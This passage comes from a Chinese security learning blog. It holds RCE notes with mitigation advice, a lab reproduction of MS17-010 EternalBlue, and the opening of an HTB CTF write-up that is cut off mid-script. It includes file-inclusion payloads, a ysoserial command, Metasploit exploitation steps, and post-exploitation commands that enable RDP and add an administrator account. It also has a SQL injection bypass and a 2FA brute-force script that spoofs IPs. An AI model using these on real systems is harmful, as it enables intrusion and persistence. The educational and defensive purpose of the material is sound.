&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;选择文件&lt;/label&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传文件&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//move_uploaded_file</span><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tap_name&quot;</span>],<span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="修复-预防方案-2"><a href="#修复-预防方案-2" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><ul><li>白名单验证：仅允许上传已知安全的文件类型，例如图片文件（jpg, png等），并拒绝所有其他类型的文件。这要求系统能够验证文件的真实类型，而不仅仅是依赖文件扩展名</li><li>文件类型检测：通过检测文件的MIME类型或者文件内容的特定标识（如图片文件的头信息）来判断文件类型，而不是仅仅依赖于文件的扩展名。（不推荐，容易绕过）</li><li>文件内容扫描：使用病毒扫描工具扫描所有上传的文件，以识别和阻止恶意软件或脚本的上传</li><li>设置文件上传大小限制：限制可上传文件的大小，减少攻击者上传大型恶意文件的机会。（不推荐，部分木马内存较小）</li><li>文件存储隔离：不要将上传的文件存储在执行脚本的目录下，避免恶意脚本被服务器执行。可以将文件存储在非Web根目录下，并通过安全的方式提供文件访问（例如，通过脚本读取文件内容并输出，而不是直接通过URL访问）</li><li>重命名上传文件：为上传的文件重新命名（例如，使用UUID或其他随机字符串），避免直接使用用户提供的文件名，这样可以防止目录遍历攻击和文件覆盖攻击</li><li>设置强制访问控制：确保文件上传功能只对信任的用户开放，并对用户进行身份验证和授权</li></ul><h2 id="文件包含导致RCE"><a href="#文件包含导致RCE" class="headerlink" title="文件包含导致RCE"></a>文件包含导致RCE</h2><p>文件包含漏洞允许攻击者将服务器上的文件包含到输出页面中，或者包含远程文件，从而执行恶意代码。主要分为两种类型：本地文件包含（Local File Inclusion, LFI）和远程文件包含（Remote File Inclusion, RFI）</p><h3 id="PHP本地文件包含（LFI）"><a href="#PHP本地文件包含（LFI）" class="headerlink" title="PHP本地文件包含（LFI）"></a>PHP本地文件包含（LFI）</h3><p>众所周知，PHP的代码要执行的话，需要后缀名为.php。但PHP当中关于文件包含的函数就可以在文件名为.txt等其他不同后缀的情况下，执行PHP代码</p><p>利用include 和 require两个函数，同时包含1.txt，成功地输出了两次test字符。这两个函数的区别在于，如果include包含一个不存在的文件只会警告，而require会直接停止运行。还有两个函数为<code>include_once</code>和<code>require_once</code>，这两个函数与本身的区别在于，如果已经包含过了目标则不会包含</p><p>如果目标文件不是php代码，则会直接输出目标文件内容</p><h3 id="PHP-远程文件包含（RFI）-PHP伪协议"><a href="#PHP-远程文件包含（RFI）-PHP伪协议" class="headerlink" title="PHP 远程文件包含（RFI）+PHP伪协议"></a>PHP 远程文件包含（RFI）+PHP伪协议</h3><p>而PHP当中还有远程文件包含（RFI），在实战中，利用PHP伪协议的配合会有更多的进攻方向与思路。 而要使用远程文件包含需要目标环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = Onallow_url_include = On<br></code></pre></td></tr></table></figure><p>这两个参数需要在php.ini单独设置，在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off，所以需要我们手动从Off改成On</p><p>开启之后我们就可以进行利用了，一般来说，实战当中大部分都是文件包含配合 <code>php://input</code> 或 <code>data://</code> 进行RCE的</p><p><strong>php:&#x2F;&#x2F;input</strong></p><p>可以将post中的数据当成PHP的代码来执行</p><p><strong>data:&#x2F;&#x2F;</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<br>data:<span class="hljs-comment">//text/plain,&lt;?php%20phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA文件包含方式"><a href="#JAVA文件包含方式" class="headerlink" title="JAVA文件包含方式"></a>JAVA文件包含方式</h3><p>Java代码也是利用include进行文件包含</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//index.jsp</span><br>&lt;% <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test.jsp&quot;</span>; %&gt;<br>&lt;jsp:include page=<span class="hljs-string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;% out.println(Test!);%&gt;<br></code></pre></td></tr></table></figure><p>但不同于php，java的文件包含无法对.txt文件中的java代码进行解析，所有危害有限，一般作为任意文件读取或下载。但除非是被包含的jsp文件，正常方式无法访问到且其中存在危险函数，这时就可以利用文件包含打RCE了</p><h2 id="SSTI导致RCE"><a href="#SSTI导致RCE" class="headerlink" title="SSTI导致RCE"></a>SSTI导致RCE</h2><p>在说ssti之前，先说下模板引擎，简单来说就是为了分离用户界面和业务数据的。运行逻辑是先获取用户的输入，经过渲染后呈现到用户面前。而SSTI就是服务端模板注入，当用户输入恶意数据后，未经过滤下就可能造成安全危害</p><p>而服务器端模板注入（Server-Side Template Injection，SSTI）是一种安全漏洞，允许攻击者通过向服务器端模板引擎提交恶意输入数据来注入并执行不安全的代码。这种攻击的成功依赖于服务器端模板引擎的配置和功能</p><p><img src="/img/SSTI.png" alt="SSTI"></p><h3 id="修复-预防方案-3"><a href="#修复-预防方案-3" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><ul><li>验证和清理输入：对所有用户输入进行严格验证和清理，确保输入内容不包含可能会被模板引擎错误解释执行的代码或标记</li><li>使用安全的模板引擎配置：许多模板引擎提供了防止SSTI的安全配置选项。确保模板引擎以最安全的方式配置，并禁用不必要的功能</li><li>限制模板引擎功能：限制模板引擎可以访问的功能和API，尽量减少攻击者可利用的攻击面。例如，禁止模板直接访问文件系统或执行系统命令</li><li>使用沙箱环境：在可能的情况下，将模板引擎运行在沙箱环境中，以限制模板代码的执行权限，防止恶意代码访问或修改敏感资源</li><li>内容安全策略（CSP）：实施内容安全策略，限制可以执行的脚本类型和来源，降低潜在的攻击影响</li><li>更新和打补丁：定期更新和给模板引擎及其依赖库打补丁，以修复已知的安全漏洞</li></ul><h2 id="反序列化导致RCE"><a href="#反序列化导致RCE" class="headerlink" title="反序列化导致RCE"></a>反序列化导致RCE</h2><p>反序列化漏洞发生在当不安全地处理从不可信源接收的序列化数据时。序列化是将对象状态或数据结构转换为可以存储或传输的格式（如XML、JSON、二进制格式）的过程，而反序列化是将这种格式恢复为原始的对象状态或数据结构的过程。如果应用程序不安全地反序列化用户提供的数据，攻击者可能能够执行恶意代码或操作应用程序行为，导致数据泄露、服务拒绝、甚至完全控制受影响的服务器</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>在PHP当中，关于序列化和反序列化的魔法函数有很多，魔术方法是一种特殊的方法，当对 对象执行某些操作时会覆盖 PHP 的默认操作。而PHP中最为常见也是最为基础的就是<code>__construct</code>和<code>__destruct</code></p><p><strong>__construct</strong> 构造函数，具有构造函数的类会在每次创建新对象时先调用此方法</p><p><strong>__destruct</strong> 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><p>先进行一次简单的序列化和反序列化的过程，如下，<code>OBjectOutputStream中writeObject</code>是进行序列化的过程，而readObject是进行反序列化的过程。并且从写入到object.dat文件当中可知，java序列化的数据不是纯文本格式不可读</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">serialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;object.dat&quot;</span>));<br>            out.writeObject(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            out.close();<br>            <span class="hljs-comment">//反序列化</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;object.dat&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;反序列化的对象：&quot;</span> + in.readObject());<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Java进行反序列化RCE只用本身的代码较麻烦，这里使用一个通用简单的来演示，因为java需要安装依赖才能继续，所以先把大部分项目必备的依赖安装了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">commons</span>-beanutils-<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>.jar(https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>/commons-beanutils-<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>.ja)<br><span class="hljs-attribute">commons</span>-collections-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar(https://repo1.maven.org/maven2/commons-collections/commons-collections/<span class="hljs-number">3</span>.<span class="hljs-number">1</span>/commons-collections-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar)<br><span class="hljs-attribute">commons</span>-logging-<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.jar(https://repo1.maven.org/maven2/commons-logging/commons-logging/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>/commons-logging-<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.jar)<br></code></pre></td></tr></table></figure><p>java生成payload的工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ysoserial.jar（https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/frohoff/y</span>soserial）<br></code></pre></td></tr></table></figure><p>将依赖都放在项目目录下，并add to library</p><p>使用命令生成 payload</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span><span class="hljs-string">&quot;ysoserial-all.jar&quot;</span> CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; <span class="hljs-number">1</span>.ser<br></code></pre></td></tr></table></figure><p>访问index.jsp，可以看出成功弹出计算器，rce成功</p><h3 id="修复-预防方案-4"><a href="#修复-预防方案-4" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>尽量用高版本JDK，因为禁了 <code>RMI Codebase</code> &#x2F; <code>TemplatesImpl （JDK17）</code> 等危险的类</p><p>使用白名单机制限制可反序列化的类和对象类型，只允许已知、受信任的类进行反序列化。确保白名单列表具有最小化的权限，即只包含必需的类和对象</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MS17-010(Eternal blue永恒之蓝)漏洞复现</title>
    <link href="/2024/05/29/ms17-010/"/>
    <url>/2024/05/29/ms17-010/</url>
    
    <content type="html"><![CDATA[<h1 id="MS17-010-Eternal-blue永恒之蓝"><a href="#MS17-010-Eternal-blue永恒之蓝" class="headerlink" title="MS17-010(Eternal blue永恒之蓝)"></a>MS17-010(Eternal blue永恒之蓝)</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝”</p><p>具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可以利用这个漏洞来远程执行恶意代码，甚至控制受感染的计算机，而无需用户交互</p><p>攻击者可以利用永恒之蓝进行各种恶意活动，包括勒索软件攻击、间谍活动、信息窃取等。该漏洞被广泛利用，导致了全球范围内的许多严重的网络安全事件，包括2017年的“想象力病毒”（WannaCry）攻击事件</p><p>微软在发现漏洞后发布了补丁来修复这个问题，并呼吁用户及时更新其系统以保护自己免受潜在的攻击。然而，由于许多用户未能及时更新其系统，永恒之蓝仍然是一个潜在的威胁，特别是对于那些运行旧版本Windows系统的用户。因此，及时更新系统补丁并采取其他安全措施仍然是保护自己免受此类攻击的最佳做法之一</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h3><p>本次的漏洞环境是上课老师提供的靶场，要求我们去扫描C段，查找存活的IP并尝试利用其存在的相关漏洞</p><p>我最初尝试使用goby进行扫描，也是最早通过它报警漏洞发现192.168.12.8的445开放，且可能存在MS17-010，之后使用nmap和fscan以及nessus扫描验证，确认192.168.12.8以及其他数十个IP存在MS17-010漏洞</p><p>nmap批量扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p445 --script smb-vuln-ms17-<span class="hljs-number">010</span> <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>fscan定点扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 192.168.12.8<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开msfconsole终端，搜索MS17-010的相关漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure><p>在搜索到的相关模块中，选择<code>exploit/windows/smb/ms17_010_eternalblue</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-comment">#或者</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>设置Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>网上大多数教程中，要求设置的Payload为：<code>set payload windows/meterpreter/reverse_tcp</code> 但在我的实验环境中，使用此Payload并未成功，具体分析为：</p><p><strong>reverse_tcp：</strong>攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经反向连接</p><p><strong>bind_tcp：</strong>攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入</p><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST</p><p>查看需要填写的相关参数、载荷等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p>设置目标被攻击主机的IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS 被攻击机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听主机IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LHOST 本机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LPORT 本机端口<br></code></pre></td></tr></table></figure><p>开始攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span><br><span class="hljs-comment">#或者</span><br>exploit<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>开始攻击前，请确保本机的相关防护程序关闭，否则它们会变成内鬼</p><p><img src="/img/ms17_010_1.png" alt="ms17_010_1"></p><p>当出现<code>WIN</code>则表面漏洞利用成功</p><p><img src="/img/ms17_010_2.png" alt="ms17_010_2"></p><p>这边我尝试<code>getuid</code>查询用户，发现拿到的是系统权限</p><p>在<code>shell</code>后，查看ipconfig</p><p><img src="/img/ms17_010_3.png" alt="ms17_010_3"></p><p><img src="/img/ms17_010_4.png" alt="ms17_010_4"></p><p>使用screenshot还可以截取被攻击机器当前的屏幕截图</p><p><img src="/img/ms17_010_5.png" alt="ms17_010_5"></p><p>利用拿到的<code>shell</code>查看被攻击机器所开放的端口</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -an</span><br></code></pre></td></tr></table></figure><p>发现3389端口没有开放，手动给它打开</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-comment">#或者</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>显示<code>successful</code>即为成功</p><p>再次确认3389端口是否开启</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an|<span class="hljs-built_in">find</span> <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure><p>显示LISTENING即为监听中</p><p><strong>注意！</strong></p><p>远程桌面的默认端口是3389，为了防止管理员更改了远程端口给我们连接带来意想不到的情况，需要通过查看注册表键值确认远程桌面的端口是否为3389</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">REG</span> <span class="hljs-keyword">QUERY</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber<br></code></pre></td></tr></table></figure><p>若出现为0xd3d为正常，0xd3d为16进制的3389</p><p>添加一个新的用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">用户名 密码 /add</span><br></code></pre></td></tr></table></figure><p>将新建的用户添加进管理员组</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators 用户名 /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>成功连接远程桌面</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Windows漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_No-Threshold</title>
    <link href="/2024/05/28/htb-WsTodo/"/>
    <url>/2024/05/28/htb-WsTodo/</url>
    
    <content type="html"><![CDATA[<h1 id="No-Threshold"><a href="#No-Threshold" class="headerlink" title="No-Threshold"></a>No-Threshold</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Prepare for the finest magic products out there. However, please be aware that we’ve implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.</p><p>为最好的魔法产品做好准备。但是，请注意，我们已经在我们的网络应用程序中实施了专门的保护咒语，以防止任何针对我们网上商店的黑魔法。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>下载题目源码进行分析，通过<code>dashboard.py</code>可知，当我们通过身份验证，便可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dash</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;private/dashboard.html&quot;</span>, flag=Config.FLAG)<br></code></pre></td></tr></table></figure><p>查看<code>login.py</code>若用户成功登录将被重定向到<code>/auth/verify-2fa</code>若未成功，则回到<code>public/login.html</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>但在页面点击<code>login</code>返回报错403，对其路径进行模糊测试，发现<code>//auth/login</code>可以成功绕过</p><p>尝试使用万能密码绕过登录验证，结果成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span>password<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/auth/verify-2fa</code> 页面，此处因为只有四位纯数字，于是尝试使用爆破，同时由于短时间内同一IP请求次数过多将被服务器阻止，这里通过修改<code>X-Forwarded-For</code>实现每五个请求更换一个IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent. futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_combinations_in_array</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read().splitlines()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_response</span>(<span class="hljs-params">response, combination</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Invalid 2FA Code!&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Try: <span class="hljs-subst">&#123;combination&#125;</span>\n&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;GOT IT!\n2FA Code: <span class="hljs-subst">&#123;combination&#125;</span>\n<span class="hljs-subst">&#123;response.text&#125;</span>\n&#x27;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">ip, combination, headers, url</span>):<br>    headers[<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>] = ip<br>    data = &#123;<span class="hljs-string">&#x27;2fa-code&#x27;</span>: <span class="hljs-built_in">str</span>(combination)&#125;<br><br>    response = requests.post(url, headers=headers, data=data)<br>    handle_response(response, combination)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_all_requests</span>(<span class="hljs-params">url, combinations_array</span>):<br>    base_ip = <span class="hljs-string">&#x27;192.168.&#x27;</span><br>    current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span 